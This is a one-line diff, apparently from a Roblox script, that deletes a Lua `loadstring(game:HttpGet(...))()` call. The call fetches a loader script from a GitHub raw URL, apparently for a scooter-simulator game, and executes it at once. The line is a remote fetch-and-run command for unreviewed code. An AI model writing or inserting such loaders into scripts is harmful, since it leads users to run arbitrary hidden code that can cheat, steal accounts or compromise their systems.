@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/races-wheelie-a-kukirin-escooter-simulat-spam7-98ofmbuqode4ru.lua"))()
